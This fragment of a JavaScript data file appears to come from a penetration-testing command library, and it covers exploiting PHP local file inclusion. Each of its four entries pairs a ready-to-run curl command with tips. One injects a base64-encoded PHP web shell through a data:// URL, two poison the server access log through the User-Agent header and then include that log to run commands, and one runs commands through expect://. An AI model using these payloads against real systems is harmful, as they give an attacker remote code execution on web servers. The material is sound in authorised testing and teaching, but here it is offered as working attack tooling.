Object.assign(n[1757],{"tool":"sh","run":"curl -s 'http://{{target}}/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4=&cmd=id' | grep uid","note":"data:// wrapper: the payload rides INSIDE the URL (base64 of <?php system($_GET[\"cmd\"]);?>). Survives when php://input is blocked."});
Object.assign(n[1758],{"tool":"sh","run":"curl -s \"http://{{target}}/\" -H \"User-Agent: <?php system(\\$_GET['cmd']); ?>\"","note":"LOG POISONING step 1: write PHP into access.log via the User-Agent header (also try the path itself, SSH auth logs via invalid usernames)."});
Object.assign(n[1759],{"tool":"sh","run":"curl -s \"http://{{target}}/index.php?page=../../../../var/log/apache2/access.log&cmd=id\"","note":"Step 2: include the log — your poisoned line executes. Also try /var/log/nginx/access.log, /var/log/auth.log, /proc/self/environ. Find log paths via phpinfo or the LFI cheat sheet."});
Object.assign(n[1760],{"tool":"sh","run":"curl -s \"http://{{target}}/index.php?page=expect://id\"","note":"expect:// runs the argument as a command directly — rare (needs the expect module) but instant."});
